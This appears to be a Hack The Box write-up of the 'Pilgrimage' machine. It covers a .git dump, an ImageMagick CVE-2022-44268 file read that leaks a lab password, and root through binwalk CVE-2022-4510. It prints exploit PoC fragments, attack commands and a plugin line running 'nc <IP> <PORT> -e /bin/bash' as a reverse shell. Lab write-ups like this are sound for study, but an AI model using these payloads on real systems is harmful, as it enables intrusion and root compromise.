---
layout: post
title: "HTB: Pilgrimage"
subtitle: "exposed .git revealed bundled ImageMagick vulnerable to CVE-2022-44268 file read, then a binwalk CVE-2022-4510 root cron"
date: 2023-08-28
tags: [htb, linux, git-dump, imagemagick, cve, cron]
category: writeups
kind: machine
tldr: "An exposed /.git dumped the source and a bundled ImageMagick 7.1.0-49. CVE-2022-44268 let me read arbitrary files through a crafted PNG, which leaked the SQLite DB and emily's password for SSH. A root cron ran binwalk 2.3.2 (CVE-2022-4510) on uploaded files for a root shell."
---

## the box

Pilgrimage is an easy Linux box running a PHP image-shrinking app on nginx port 80, plus SSH. Upload an image and it returns a resized copy. The web root has an exposed `.git`, so the whole source plus the exact `magick` binary the app calls comes down with a dumper. That binary is a known-vulnerable ImageMagick, and CVE-2022-44268 turns the resize feature into an arbitrary file read. Reading the SQLite DB gives a plaintext password for SSH. A root process watches the upload directory and runs an old `binwalk` on whatever appears, and that `binwalk` is vulnerable to CVE-2022-4510 for code execution as root.

## recon

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
```

Port 80 redirects to `pilgrimage.htb`, so it goes in `/etc/hosts`:

```bash
echo '10.10.11.219 pilgrimage.htb' | sudo tee -a /etc/hosts
```

The app is a PHP image shrinker. Register, log in, upload an image, and it hands back a resized copy under `/shrunk/`. The upload POST is a normal `multipart/form-data` body with the file in `toConvert`, and the response redirects to a `?message=...&status=success` URL pointing at the converted file:

```
GET /?message=http://pilgrimage.htb/shrunk/64c551eb839b9.jpeg&status=success HTTP/1.1
```

That `message=` looked like it might be a file include, but feeding it URLs went nowhere. It is a rabbit hole, just a status string echoed back.

Directory brute force is where it opens up. There is an exposed Git repository:

```bash
gobuster dir -u http://pilgrimage.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```

```
/assets     (Status: 301)
/vendor     (Status: 301)
/tmp        (Status: 301)
/.git       (Status: 301)
/.git/HEAD  (Status: 200) [Size: 23]
/.git/config(Status: 200) [Size: 92]
/.git/index (Status: 200) [Size: 3768]
/index.php  (Status: 200) [Size: 7621]
```

`/.git/` is browsable, so I pulled the entire repo with git-dumper:

```bash
git-dumper http://pilgrimage.htb/.git git
```

That reconstructed the whole app. `index.php` does the login against a SQLite DB:

```php
$db = new PDO('sqlite:/var/db/pilgrimage');
$stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");
$stmt->execute(array($username,$password));
```

The query is a prepared statement, so the login is not injectable. The two things worth keeping from the source are the DB path `/var/db/pilgrimage`, and the fact that the repo ships the `magick` binary the app shells out to for resizing. Fingerprint it:

```bash
file ./magick
```

```
./magick: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, ... stripped
```

```bash
./magick --version
```

```
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
```

## foothold

ImageMagick `7.1.0-49` is vulnerable to CVE-2022-44268, an arbitrary file read found by MetabaseQ. When ImageMagick parses a PNG that has a `tEXt` chunk with the keyword `profile`, it treats the chunk's value as a filename, reads that file, and embeds its contents into the output image as a hex string in a `Raw profile type` field. Since the app converts every upload through this binary, an uploaded crafted PNG comes back with file contents baked in, readable with `identify -verbose`.

I used the Sybil Scan PoC. `generate.py` builds a blank gradient PNG and adds a `profile` text chunk naming the file to read:

```python
info = PngImagePlugin.PngInfo()
info.add_text("profile", args.lfile)
im = Image.open("gradient.png")
im.save(args.output, "PNG", pnginfo=info)
```

I first proved the bug against `/etc/passwd`, then aimed at the SQLite DB. Generate the PoC PNG, convert it locally to confirm, then upload the original through the web app:

```bash
python3 generate.py -f "/var/db/pilgrimage" -o exploit.png
```

```
   [>] ImageMagick LFI PoC - by Sybil Scan Research
   [>] Generating Blank PNG
   [>] Placing Payload to read /var/db/pilgrimage
   [>] PoC PNG generated > exploit.png
```

Upload `exploit.png` through the dashboard. The app resizes it and stores the result under `/shrunk/<hash>.png`. I grabbed the converted file back from the server:

```bash
wget http://pilgrimage.htb/shrunk/64ea15b80308f.png
```

The embedded file is in the `Raw profile type` block of the verbose output, as hex. Strip everything except the hex and reverse it back to bytes:

```bash
identify -verbose 64ea15b80308f.png | grep -Pv "^( |Image)" | xxd -r -p > pilgrimage.sqlite
```

That recovered the actual SQLite database. To sanity-check, the first read I did was `/etc/passwd`, whose hex decoded to the normal passwd file and confirmed `emily:x:1000:1000:emily,,,:/home/emily:/bin/bash` as the human user. Now query the recovered DB:

```bash
file pilgrimage.sqlite
# SQLite 3.x database
sqlite3 pilgrimage.sqlite "select username,password from users;"
```

```
emily|abigchonkyboi123
```

The schema also has an `images` table, but the win is emily's plaintext password.

## user

`emily` reuses that password for SSH:

```bash
ssh emily@pilgrimage.htb
# password: abigchonkyboi123
```

That dropped a shell as `emily` and the user flag. emily is not in sudoers:

```
emily@pilgrimage:~$ sudo -s
[sudo] password for emily:
emily is not in the sudoers file.  This incident will be reported.
```

## root

Enumeration with a process monitor (or pspy) shows a root job watching the upload directory and running binwalk on whatever lands there:

```
UID=0  /bin/bash /usr/sbin/malwarescan.sh
UID=0  /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
```

The script:

```bash
cat /usr/sbin/malwarescan.sh
```

```bash
#!/bin/bash
blacklist=("Executable script" "Microsoft executable")
/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
    filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
    binout="$(/usr/local/bin/binwalk -e "$filename")"
    for banned in "${blacklist[@]}"; do
        if [[ "$binout" == *"$banned"* ]]; then
            /usr/bin/rm "$filename"
            break
        fi
    done
done
```

So as root, every new file in `shrunk/` gets `binwalk -e` run on it, and the file is deleted if binwalk's output mentions an executable. My first instinct was to abuse the `read` / `PATH` around the script, but that goes nowhere. The blacklist also does not matter, because the exploit fires inside the `binwalk -e` call itself, before the grep ever runs.

Check the binwalk version:

```bash
binwalk
```

```
Binwalk v2.3.2
Craig Heffner, ReFirmLabs
```

binwalk `2.3.2` is vulnerable to CVE-2022-4510 (ONEKEY Research, exploit EDB-51249), a path-traversal RCE in the PFS filesystem extractor. A crafted file declares a PFS entry whose filename contains `../` sequences. binwalk's extractor builds the output path with `os.path.join()` and does not resolve the traversal, so it writes the extracted content wherever the filename points. The exploit aims that at `~/.config/binwalk/plugins/binwalk.py`. binwalk auto-loads plugins from that directory, so the dropped file is a Python plugin that executes the next time binwalk runs.

The public PoC takes a real PNG, appends the malicious PFS header (which encodes the `../../../.config/binwalk/plugins/binwalk.py` path), then appends the plugin body, which is a binwalk plugin whose `init()` shells out to my listener:

```python
header_pfs = bytes.fromhex("5046532f302e39...2e2e2f2e2e2f2e2e2f2e636f6e6669672f62696e77616c6b2f706c7567696e732f62696e77616c6b2e7079...")
lines = ['import binwalk.core.plugin\n', 'import os\n', 'import shutil\n',
         'class MaliciousExtractor(binwalk.core.plugin.Plugin):\n',
         '    def init(self):\n',
         '        if not os.path.exists("/tmp/.binwalk"):\n',
         '            os.system("nc <IP> <PORT> -e /bin/bash 2>/dev/null &")\n', ...]
```

Build the malicious PNG from my earlier converted image, pointing the callback at my box:

```bash
python3 exp.py result.png 10.10.16.X 4444
```

```
You can now rename and share binwalk_exploit and start your local netcat listener.
```

Then drop `binwalk_exploit.png` into the watched directory and wait for the root job to pick it up:

```bash
cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
```

With `nc -lvnp 4444` waiting, `inotifywait` fires, root runs `binwalk -e` on my file, the PFS extractor writes my plugin into `~/.config/binwalk/plugins/`, and binwalk loads and runs it as root. The plugin's `init()` connects back, and I get a root shell and the root flag.

## takeaway

A leaked `.git` handed me the full source and, more usefully, the exact `magick` build, which mapped straight to a known file-read CVE. Reading the SQLite DB through that bug was enough for SSH because the password was stored in plaintext. The root path is a second supply-chain-style CVE: a tool a root cron runs on attacker-supplied files. The script's blacklist was a distraction, the bug triggers during extraction itself, so what gets scanned never mattered, only that something got scanned.
